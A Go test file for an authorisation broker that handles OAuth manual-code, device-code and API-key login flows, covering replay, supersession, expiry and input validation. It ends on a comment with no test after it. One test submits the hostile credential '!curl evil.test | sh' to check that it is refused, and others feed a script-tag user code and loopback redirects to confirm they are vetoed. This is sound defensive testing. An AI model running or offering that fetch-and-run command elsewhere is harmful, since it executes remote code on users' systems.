package piacp

import (
	"context"
	"encoding/json"
	"errors"
	"testing"
	"time"

	"github.com/coder/acp-go-sdk"
	"github.com/stretchr/testify/require"

	"github.com/savid/acp-go-pi/internal/pi"
)

const (
	authTestURL      = "https://provider.test/authorize?client_id=abc"
	authTestVerify   = "https://provider.test/device"
	authTestUserCode = "ABCD-EFGH"
)

func authorizeParams(harness *authHarness, providerID string, generation string, method string) map[string]any {
	return map[string]any{
		authFieldSessionID:          string(harness.session.id),
		authFieldProviderID:         providerID,
		authFieldConnectionID:       "conn-1",
		authFieldMethodsGeneration:  generation,
		authFieldMethod:             method,
		authFieldAuthorizeRequestID: "req-1",
	}
}

// scriptManualCodeLogin models pi's anthropic shape: an auth_url event, then a
// manual-code prompt the callback leg answers, then the terminal result.
func scriptManualCodeLogin(harness *authHarness, code string, result pi.AuthMessage) {
	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		if request.Op != pi.AuthOpLogin {
			return nil
		}

		harness.deliver(ctx, pi.AuthMessage{
			ID:    request.ID,
			Kind:  pi.AuthKindEvent,
			Event: &pi.AuthNativeEvent{Type: authNativeEventAuthURL, URL: authTestURL, Instructions: "Complete login in your browser."},
		})

		parked := harness.deliver(ctx, pi.AuthMessage{
			ID:      request.ID,
			Kind:    pi.AuthKindPrompt,
			Prompt:  pi.AuthPromptManualCode,
			Message: "Paste the authorization code here",
		})

		answer := harness.awaitAnswer(parked)
		if answer.Value == nil || *answer.Value != code {
			return errors.New("unexpected callback value")
		}

		result.ID = request.ID
		result.Kind = pi.AuthKindResult
		harness.deliver(ctx, result)

		return nil
	})
}

func startManualCodeFlow(t *testing.T, harness *authHarness, code string, result pi.AuthMessage) string {
	t.Helper()

	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())
	scriptManualCodeLogin(harness, code, result)

	authorized, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth))
	require.NoError(t, err)

	return authorizeResult(t, authorized).FlowID
}

func authorizeResult(t *testing.T, value any) authAuthorizeResult {
	t.Helper()

	result, ok := value.(authAuthorizeResult)
	require.True(t, ok)

	return result
}

// authorizeCall is one authorize leg answered off the calling goroutine, so a
// test can observe whether a concurrent repeat waits.
type authorizeCall struct {
	result any
	err    error
}

func callAuthorize(harness *authHarness, params map[string]any) authorizeCall {
	result, err := harness.call(context.WithoutCancel(harness.t.Context()), AuthAuthorizeMethod, params)

	return authorizeCall{result: result, err: err}
}

func authFailureFlowID(t *testing.T, err error) string {
	t.Helper()

	var requestError *acp.RequestError
	require.ErrorAs(t, err, &requestError)

	data, ok := requestError.Data.(map[string]any)
	require.True(t, ok)

	flowID, ok := data[authFieldFlowID].(string)
	require.True(t, ok)

	return flowID
}

// TestAuthorizeManualCodeFlowPresentation pins the callback presentation: pi's
// paste-back login parks its prompt and the leg returns while it waits.
func TestAuthorizeManualCodeFlowPresentation(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())
	scriptManualCodeLogin(harness, "code-1", pi.AuthMessage{OK: true, CredType: "oauth", Expires: 4242})

	result, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth))
	require.NoError(t, err)

	presentation := authorizeResult(t, result)
	require.Equal(t, authInteractionCallback, presentation.Interaction)
	require.Equal(t, authTestURL, presentation.URL)
	require.Equal(t, "Complete login in your browser.", presentation.Message)
	require.Equal(t, authCallbackInputCode, presentation.CallbackInput)
	require.NotEmpty(t, presentation.FlowID)
	require.Positive(t, presentation.FlowExpiresAt)
	require.Zero(t, presentation.PollIntervalMs)
	require.Empty(t, presentation.UserCode)
}

// TestAuthorizePersistsIntentBeforeReturning pins that the ledger names the
// flow's slot before the leg answers.
func TestAuthorizePersistsIntentBeforeReturning(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	flowID := startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	record, ok, err := harness.broker.ledger.read("anthropic")
	require.NoError(t, err)
	require.True(t, ok)
	require.Equal(t, authLedgerIntent, record.State)
	require.Equal(t, flowID, record.FlowID)
	require.Equal(t, "conn-1", record.ConnectionID)
	require.Equal(t, "req-1", record.AuthorizeRequestID)
	require.Equal(t, int64(1), record.Revision)
	require.Equal(t, int64(1), record.BindingGeneration)
}

// TestAuthorizeReplaysIdempotencyKeyVerbatim pins that a repeat performs no
// native call and returns the recorded presentation.
func TestAuthorizeReplaysIdempotencyKeyVerbatim(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())
	scriptManualCodeLogin(harness, "code-1", pi.AuthMessage{OK: true})

	params := authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth)

	first, err := harness.call(t.Context(), AuthAuthorizeMethod, params)
	require.NoError(t, err)

	harness.scriptBridge(func(_ context.Context, _ pi.AuthRequest) error {
		require.FailNow(t, "a replayed authorizeRequestId must make no native call")

		return nil
	})

	second, err := harness.call(t.Context(), AuthAuthorizeMethod, params)
	require.NoError(t, err)
	require.Equal(t, first, second)
}

// TestAuthorizeReplaysAfterTerminalization pins that the idempotency key
// outlives the flow's terminalization: the repeat answers from the retained
// record without superseding, bumping the ledger, or calling the harness.
func TestAuthorizeReplaysAfterTerminalization(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())
	scriptManualCodeLogin(harness, "code-1", pi.AuthMessage{OK: true})

	params := authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth)

	first, err := harness.call(t.Context(), AuthAuthorizeMethod, params)
	require.NoError(t, err)

	flowID := authorizeResult(t, first).FlowID

	_, err = harness.call(t.Context(), AuthCallbackMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "anthropic",
		authFieldMethod:     authMethodTypeOAuth,
		authFieldFlowID:     flowID,
		authFieldInput:      "code-1",
	})
	require.NoError(t, err)

	harness.broker.mu.Lock()
	_, pending := harness.broker.flows[authFlowKey{sessionID: harness.session.id, providerID: "anthropic"}]
	harness.broker.mu.Unlock()
	require.False(t, pending, "the completed flow has left the pending map")

	harness.scriptBridge(func(_ context.Context, _ pi.AuthRequest) error {
		require.FailNow(t, "a replayed authorizeRequestId must make no native call")

		return nil
	})

	second, err := harness.call(t.Context(), AuthAuthorizeMethod, params)
	require.NoError(t, err)
	require.Equal(t, first, second)
	require.Equal(t, authStateAuthenticated, harness.broker.flowState(harness.broker.byID[flowID]))

	record, _, err := harness.broker.ledger.read("anthropic")
	require.NoError(t, err)
	require.Equal(t, int64(1), record.Revision, "a replay is not a new generation")
}

// TestAuthorizeReplayWaitsForTheMint pins that a repeat arriving while the
// native mint is still running holds until the presentation is published rather
// than replaying an empty one.
func TestAuthorizeReplayWaitsForTheMint(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	minting := make(chan struct{})
	release := make(chan struct{})

	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		close(minting)
		<-release

		harness.deliver(ctx, pi.AuthMessage{
			ID:    request.ID,
			Kind:  pi.AuthKindEvent,
			Event: &pi.AuthNativeEvent{Type: authNativeEventAuthURL, URL: authTestURL, Instructions: "Complete login in your browser."},
		})
		harness.deliver(ctx, pi.AuthMessage{
			ID:      request.ID,
			Kind:    pi.AuthKindPrompt,
			Prompt:  pi.AuthPromptManualCode,
			Message: "Paste the authorization code here",
		})

		return nil
	})

	params := authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth)

	first := make(chan authorizeCall, 1)
	go func() { first <- callAuthorize(harness, params) }()

	<-minting

	repeat := make(chan authorizeCall, 1)
	go func() { repeat <- callAuthorize(harness, params) }()

	select {
	case <-repeat:
		require.FailNow(t, "a repeat arriving during the mint must wait for the presentation")
	case <-time.After(50 * time.Millisecond):
	}

	close(release)

	minted := <-first
	require.NoError(t, minted.err)

	replayed := <-repeat
	require.NoError(t, replayed.err)
	require.Equal(t, minted.result, replayed.result)
	require.Equal(t, authInteractionCallback, authorizeResult(t, replayed.result).Interaction)
	require.NotEmpty(t, authorizeResult(t, replayed.result).FlowID)
}

// TestAuthorizeReplaysMintFailure pins that a flow whose mint never produced a
// presentation stays addressable and terminal, and that its idempotency key
// replays the same failure.
func TestAuthorizeReplaysMintFailure(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		harness.deliver(ctx, pi.AuthMessage{
			ID:    request.ID,
			Kind:  pi.AuthKindEvent,
			Event: &pi.AuthNativeEvent{Type: authNativeEventAuthURL, URL: "http://provider.test/a"},
		})

		return nil
	})

	params := authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth)

	_, err := harness.call(t.Context(), AuthAuthorizeMethod, params)
	requireAuthFailed(t, err, authCauseNativeVeto)

	flowID := authFailureFlowID(t, err)

	status, statusErr := harness.call(t.Context(), AuthStatusMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "anthropic",
		authFieldFlowID:     flowID,
	})
	require.NoError(t, statusErr)
	require.Equal(t, authStatusResult{
		FlowID: flowID,
		State:  authStateFailed,
		Reason: authReasonNativeVeto,
	}, status)

	harness.scriptBridge(func(_ context.Context, _ pi.AuthRequest) error {
		require.FailNow(t, "a replayed authorizeRequestId must make no native call")

		return nil
	})

	_, repeatErr := harness.call(t.Context(), AuthAuthorizeMethod, params)
	require.Equal(t, err, repeatErr)
}

// TestAuthorizeReplayHonoursCallerCancellation pins that a caller walking away
// from a repeat releases the leg rather than blocking on a mint nobody is
// waiting for.
func TestAuthorizeReplayHonoursCallerCancellation(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	key := authFlowKey{sessionID: harness.session.id, providerID: "anthropic"}

	harness.broker.mu.Lock()
	harness.broker.retained[key] = &authFlow{
		id:                 "flow-1",
		providerID:         "anthropic",
		authorizeRequestID: "req-1",
		ready:              make(chan struct{}),
	}
	harness.broker.mu.Unlock()

	ctx, cancel := context.WithCancel(t.Context())
	cancel()

	_, replayed, err := harness.broker.replayAuthorize(ctx, key, "req-1")
	require.True(t, replayed)
	requireAuthFailed(t, err, authCauseTimeout)
}

// TestAuthorizeSupersedesPriorFlow pins that a different idempotency key
// terminalizes the old flow, dismisses its native prompt, and makes the old id
// address nothing.
func TestAuthorizeSupersedesPriorFlow(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())
	scriptManualCodeLogin(harness, "code-1", pi.AuthMessage{OK: true})

	first, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth))
	require.NoError(t, err)

	firstID := authorizeResult(t, first).FlowID

	replacement := authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth)
	replacement[authFieldAuthorizeRequestID] = "req-2"

	second, err := harness.call(t.Context(), AuthAuthorizeMethod, replacement)
	require.NoError(t, err)
	require.NotEqual(t, firstID, authorizeResult(t, second).FlowID)

	_, err = harness.call(t.Context(), AuthStatusMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "anthropic",
		authFieldFlowID:     firstID,
	})
	requireInvalidParams(t, err)

	// The superseded flow's revision advances: a new authorize is a new
	// generation of the same connection.
	record, _, err := harness.broker.ledger.read("anthropic")
	require.NoError(t, err)
	require.Equal(t, int64(2), record.Revision)
}

func TestAuthorizeFencesGenerationAndMethod(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	stale := authorizeParams(harness, "anthropic", "stale-generation", authMethodTypeOAuth)
	_, err := harness.call(t.Context(), AuthAuthorizeMethod, stale)
	requireInvalidParams(t, err)

	unknown := authorizeParams(harness, "anthropic", generation, "nope")
	_, err = harness.call(t.Context(), AuthAuthorizeMethod, unknown)
	requireInvalidParams(t, err)

	unlisted := authorizeParams(harness, "unlisted", generation, authMethodTypeOAuth)
	_, err = harness.call(t.Context(), AuthAuthorizeMethod, unlisted)
	requireInvalidParams(t, err)
}

// TestAuthorizeBeforeAnyCatalogFailsClosed pins that a method id means nothing
// without the generation that produced it.
func TestAuthorizeBeforeAnyCatalogFailsClosed(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)

	_, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", "any", authMethodTypeOAuth))
	requireInvalidParams(t, err)
}

func TestAuthorizeRejectsBadParams(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	for _, field := range []string{
		authFieldSessionID, authFieldProviderID, authFieldConnectionID,
		authFieldMethodsGeneration, authFieldMethod, authFieldAuthorizeRequestID,
	} {
		params := authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth)
		delete(params, field)

		_, err := harness.call(t.Context(), AuthAuthorizeMethod, params)
		requireInvalidParams(t, err)
	}

	extra := authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth)
	extra["injectionKey"] = "x"
	_, err := harness.call(t.Context(), AuthAuthorizeMethod, extra)
	requireInvalidParams(t, err)

	badInputs := authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth)
	badInputs[authFieldInputs] = "not an object"
	_, err = harness.call(t.Context(), AuthAuthorizeMethod, badInputs)
	requireInvalidParams(t, err)

	// pi's enumeration declares no prompts, so any answer names one nobody
	// advertised.
	withInputs := authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth)
	withInputs[authFieldInputs] = map[string]string{"account": "acme"}
	_, err = harness.call(t.Context(), AuthAuthorizeMethod, withInputs)
	requireInvalidParams(t, err)

	_, err = harness.call(t.Context(), AuthAuthorizeMethod, "not-an-object")
	requireInvalidParams(t, err)
}

// TestAuthorizeUnknownSessionRejected pins the uniform unknown-session answer.
func TestAuthorizeUnknownSessionRejected(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	params := authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth)
	params[authFieldSessionID] = "missing"

	_, err := harness.call(t.Context(), AuthAuthorizeMethod, params)
	require.Error(t, err)
}

// TestAuthorizeDeviceCodePresentation pins pi's polling shape: the device-code
// event completes the presentation on its own and the interaction is wait.
func TestAuthorizeDeviceCodePresentation(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		harness.deliver(ctx, pi.AuthMessage{
			ID:   request.ID,
			Kind: pi.AuthKindEvent,
			Event: &pi.AuthNativeEvent{
				Type:            authNativeEventDeviceCode,
				UserCode:        authTestUserCode,
				VerificationURI: authTestVerify,
				IntervalSeconds: 5,
				ExpiresIn:       600,
			},
		})

		<-ctx.Done()

		return nil
	})

	result, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth))
	require.NoError(t, err)

	presentation := authorizeResult(t, result)
	require.Equal(t, authInteractionWait, presentation.Interaction)
	require.Equal(t, authTestVerify, presentation.URL)
	require.Equal(t, authTestUserCode, presentation.UserCode)
	require.Equal(t, int64(5000), presentation.PollIntervalMs)
	require.Empty(t, presentation.CallbackInput)

	// The effective deadline is the minimum of the native expiry and the
	// wrapper's own safety deadline.
	require.Less(t, presentation.FlowExpiresAt, authNow().Add(authSafetyDeadline).UnixMilli())
}

// TestAuthorizeRefusesLoopbackRedirect pins that a login completing on a socket
// the owner's browser cannot reach is refused at mint time.
func TestAuthorizeRefusesLoopbackRedirect(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	dialogIDs := make(chan string, 1)

	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		dialogIDs <- harness.deliver(ctx, pi.AuthMessage{
			ID:    request.ID,
			Kind:  pi.AuthKindEvent,
			Event: &pi.AuthNativeEvent{Type: authNativeEventAuthURL, URL: "https://provider.test/a?redirect_uri=http%3A%2F%2F127.0.0.1%3A1455%2Fcb"},
		})

		return nil
	})

	_, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth))
	requireAuthFailed(t, err, authCauseUnsupportedVariant)

	// The vetoed presentation cancels the native dialog rather than letting the
	// login continue toward a completion nothing will accept.
	require.True(t, harness.awaitAnswer(<-dialogIDs).Cancelled)
}

func TestAuthorizeVetoesUnusablePresentation(t *testing.T) {
	t.Parallel()

	cases := map[string]*pi.AuthNativeEvent{
		"non-https url":     {Type: authNativeEventAuthURL, URL: "http://provider.test/a"},
		"bad verify uri":    {Type: authNativeEventDeviceCode, URL: "", VerificationURI: "http://provider.test/d", UserCode: authTestUserCode},
		"bad user code":     {Type: authNativeEventDeviceCode, VerificationURI: authTestVerify, UserCode: "</script>AB"},
		"unreadable notice": {Type: "progress", Message: "Listening on http://127.0.0.1:1455"},
	}

	for name, event := range cases {
		t.Run(name, func(t *testing.T) {
			t.Parallel()

			harness := newAuthHarness(t)
			generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

			harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
				harness.deliver(ctx, pi.AuthMessage{ID: request.ID, Kind: pi.AuthKindEvent, Event: event})
				harness.deliver(ctx, pi.AuthMessage{ID: request.ID, Kind: pi.AuthKindResult, Cause: authCauseProviderRefused})

				return nil
			})

			_, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth))
			require.Error(t, err)
		})
	}
}

// TestAuthorizeFailsClosedWhenLoginCannotStart pins that a dead native channel
// is a process failure rather than a presentation.
func TestAuthorizeFailsClosedWhenLoginCannotStart(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	harness.scriptBridge(func(_ context.Context, _ pi.AuthRequest) error { return errors.New("child died") })

	_, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth))
	requireAuthFailed(t, err, authCauseNativeVeto)
}

// TestAuthorizeAPIMethodMintsNothing pins the secret interaction: an api-key
// method has nothing to mint and no native call at authorize.
func TestAuthorizeAPIMethodMintsNothing(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	harness.scriptBridge(func(_ context.Context, _ pi.AuthRequest) error {
		require.FailNow(t, "an api-key authorize makes no native call")

		return nil
	})

	result, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "openai", generation, authMethodTypeAPI))
	require.NoError(t, err)

	presentation := authorizeResult(t, result)
	require.Equal(t, authInteractionSecret, presentation.Interaction)
	require.Equal(t, "OpenAI API key", presentation.Message)
	require.Empty(t, presentation.URL)
	require.Empty(t, presentation.CallbackInput)
}

// TestCallbackCompletesOAuthFlow pins the whole manual-code path: the code
// answers the parked prompt, the ledger records the confirmation, and the flow
// reaches authenticated.
func TestCallbackCompletesOAuthFlow(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	flowID := startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true, CredType: "oauth", Expires: 4242})

	result, err := harness.call(t.Context(), AuthCallbackMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "anthropic",
		authFieldMethod:     authMethodTypeOAuth,
		authFieldFlowID:     flowID,
		authFieldInput:      "code-1",
	})
	require.NoError(t, err)
	require.Equal(t, authFlowIDResult{FlowID: flowID}, result)

	record, _, err := harness.broker.ledger.read("anthropic")
	require.NoError(t, err)
	require.Equal(t, authLedgerConfirmed, record.State)

	status, err := harness.call(t.Context(), AuthStatusMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "anthropic",
		authFieldFlowID:     flowID,
	})
	require.NoError(t, err)
	require.Equal(t, authStatusResult{FlowID: flowID, State: authStateAuthenticated, ExpiresAt: 4242}, status)
}

// TestCallbackAppliesSecretNatively pins that a secret flow reaches saved, never
// authenticated: no harness validates a secret at write time.
func TestCallbackAppliesSecretNatively(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	authorized, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "openai", generation, authMethodTypeAPI))
	require.NoError(t, err)

	flowID := authorizeResult(t, authorized).FlowID

	submitted := make(chan string, 1)

	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		require.Equal(t, pi.AuthOpLogin, request.Op)
		require.Equal(t, pi.AuthMethodAPI, request.Method)

		prompt := harness.deliver(ctx, pi.AuthMessage{
			ID:      request.ID,
			Kind:    pi.AuthKindPrompt,
			Prompt:  pi.AuthPromptSecret,
			Message: "OpenAI API key",
		})

		answer := harness.awaitAnswer(prompt)
		require.NotNil(t, answer.Value)
		submitted <- *answer.Value

		harness.deliver(ctx, pi.AuthMessage{ID: request.ID, Kind: pi.AuthKindResult, OK: true, CredType: "api_key"})

		return nil
	})

	_, err = harness.call(t.Context(), AuthCallbackMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "openai",
		authFieldMethod:     authMethodTypeAPI,
		authFieldFlowID:     flowID,
		authFieldInput:      "sk-live-value",
	})
	require.NoError(t, err)
	require.Equal(t, "sk-live-value", <-submitted)

	status, err := harness.call(t.Context(), AuthStatusMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "openai",
		authFieldFlowID:     flowID,
	})
	require.NoError(t, err)
	require.Equal(t, authStatusResult{FlowID: flowID, State: authStateSaved}, status)
}

// TestCallbackRefusesShellCredential pins the refusal that keeps a brokered
// value out of a field pi executes as a shell command.
func TestCallbackRefusesShellCredential(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	authorized, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "openai", generation, authMethodTypeAPI))
	require.NoError(t, err)

	harness.scriptBridge(func(_ context.Context, _ pi.AuthRequest) error {
		require.FailNow(t, "a shell-shaped credential never reaches the harness")

		return nil
	})

	_, err = harness.call(t.Context(), AuthCallbackMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "openai",
		authFieldMethod:     authMethodTypeAPI,
		authFieldFlowID:     authorizeResult(t, authorized).FlowID,
		authFieldInput:      "!curl evil.test | sh",
	})
	requireInvalidParams(t, err)
}

func TestCallbackAddressingFailures(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	flowID := startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	base := map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "anthropic",
		authFieldMethod:     authMethodTypeOAuth,
		authFieldFlowID:     flowID,
		authFieldInput:      "code-1",
	}

	for _, mutate := range []func(map[string]any){
		func(p map[string]any) { p[authFieldFlowID] = "unknown" },
		func(p map[string]any) { p[authFieldProviderID] = "other" },
		func(p map[string]any) { p[authFieldMethod] = "api" },
		func(p map[string]any) { delete(p, authFieldInput) },
		func(p map[string]any) { delete(p, authFieldFlowID) },
		func(p map[string]any) { delete(p, authFieldMethod) },
		func(p map[string]any) { delete(p, authFieldProviderID) },
		func(p map[string]any) { delete(p, authFieldSessionID) },
		func(p map[string]any) { p["extra"] = 1 },
	} {
		params := map[string]any{}
		for key, value := range base {
			params[key] = value
		}

		mutate(params)

		_, err := harness.call(t.Context(), AuthCallbackMethod, params)
		requireInvalidParams(t, err)
	}

	unknownSession := map[string]any{}
	for key, value := range base {
		unknownSession[key] = value
	}

	unknownSession[authFieldSessionID] = "missing"
	_, err := harness.call(t.Context(), AuthCallbackMethod, unknownSession)
	require.Error(t, err)
}

// TestCallbackOnTerminalFlowIsFlowState pins the error split: the caller
// addressed a real flow that is simply no longer accepting input.
func TestCallbackOnTerminalFlowIsFlowState(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	flowID := startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	params := map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "anthropic",
		authFieldMethod:     authMethodTypeOAuth,
		authFieldFlowID:     flowID,
		authFieldInput:      "code-1",
	}

	_, err := harness.call(t.Context(), AuthCallbackMethod, params)
	require.NoError(t, err)

	_, err = harness.call(t.Context(), AuthCallbackMethod, params)
	requireAuthFailed(t, err, authCauseFlowState)
}

// TestCallbackReportsNativeRefusalWithoutText pins that a refusal crosses as the
// closed enum and terminalizes the flow.
func TestCallbackReportsNativeRefusalWithoutText(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	flowID := startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{Cause: authCauseProviderRefused})

	_, err := harness.call(t.Context(), AuthCallbackMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "anthropic",
		authFieldMethod:     authMethodTypeOAuth,
		authFieldFlowID:     flowID,
		authFieldInput:      "code-1",
	})
	requireAuthFailed(t, err, authCauseProviderRefused)

	status, err := harness.call(t.Context(), AuthStatusMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "anthropic",
		authFieldFlowID:     flowID,
	})
	require.NoError(t, err)
	require.Equal(t, authStatusResult{
		FlowID: flowID,
		State:  authStateFailed,
		Reason: authReasonProviderRefused,
	}, status)
}

func TestAuthNativeCause(t *testing.T) {
	t.Parallel()

	for _, cause := range []string{authCauseNativeVeto, authCauseHarvestFailed, authCauseProcess} {
		require.Equal(t, cause, authNativeCause(cause))
	}

	require.Equal(t, authCauseProviderRefused, authNativeCause(""))
	require.Equal(t, authCauseProviderRefused, authNativeCause("something native"))
}

func TestStatusRejectsBadParams(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	flowID := startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	base := map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "anthropic",
		authFieldFlowID:     flowID,
	}

	for _, field := range []string{authFieldSessionID, authFieldProviderID, authFieldFlowID} {
		params := map[string]any{}
		for key, value := range base {
			params[key] = value
		}

		delete(params, field)

		_, err := harness.call(t.Context(), AuthStatusMethod, params)
		requireInvalidParams(t, err)
	}

	base["extra"] = 1
	_, err := harness.call(t.Context(), AuthStatusMethod, base)
	requireInvalidParams(t, err)
	delete(base, "extra")

	base[authFieldSessionID] = "missing"
	_, err = harness.call(t.Context(), AuthStatusMethod, base)
	require.Error(t, err)
}

// TestCancelIsIdempotentAndClaimsNothing pins the uniform wrapper cancel: it
// disarms the completer and dismisses the native prompt without asserting
// provider-side cancellation.
func TestCancelIsIdempotentAndClaimsNothing(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	flowID := startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	params := map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "anthropic",
		authFieldFlowID:     flowID,
	}

	result, err := harness.call(t.Context(), AuthCancelMethod, params)
	require.NoError(t, err)
	require.Equal(t, authFlowIDResult{FlowID: flowID}, result)

	again, err := harness.call(t.Context(), AuthCancelMethod, params)
	require.NoError(t, err)
	require.Equal(t, authFlowIDResult{FlowID: flowID}, again)

	status, err := harness.call(t.Context(), AuthStatusMethod, params)
	require.NoError(t, err)
	require.Equal(t, authStatusResult{FlowID: flowID, State: authStateCancelled, Reason: authReasonOwnerCancel}, status)
}

func TestCancelRejectsBadParams(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)

	_, err := harness.call(t.Context(), AuthCancelMethod, map[string]any{authFieldSessionID: string(harness.session.id)})
	requireInvalidParams(t, err)
}

// TestFlowExpiresOnDeadline pins the completer: on the effective deadline the
// flow becomes terminal expired/deadline and the native prompt is dismissed.
func TestFlowExpiresOnDeadline(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	flowID := startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	flow := harness.broker.byID[flowID]
	harness.broker.expire(flow)

	status, err := harness.call(t.Context(), AuthStatusMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "anthropic",
		authFieldFlowID:     flowID,
	})
	require.NoError(t, err)
	require.Equal(t, authStatusResult{FlowID: flowID, State: authStateExpired, Reason: authReasonDeadline}, status)

	// Expiry is idempotent: a terminal flow is not re-terminalized.
	harness.broker.expire(flow)
	require.Equal(t, authStateExpired, harness.broker.flowState(flow))
}

// TestCompleterFiresOnShortDeadline pins that the armed completer, not a leg,
// is what expires an abandoned flow.
func TestCompleterFiresOnShortDeadline(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	flowID := startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	flow := harness.broker.byID[flowID]

	harness.broker.mu.Lock()
	flow.expiresAt = authNow()
	harness.broker.mu.Unlock()

	harness.broker.armCompleter(flow)

	require.Eventually(t, func() bool {
		return harness.broker.flowState(flow) == authStateExpired
	}, 5*time.Second, 10*time.Millisecond)
}

// TestCloseSessionCancelsPendingFlows pins that a closing session terminalizes
// its flows before the native interrupt.
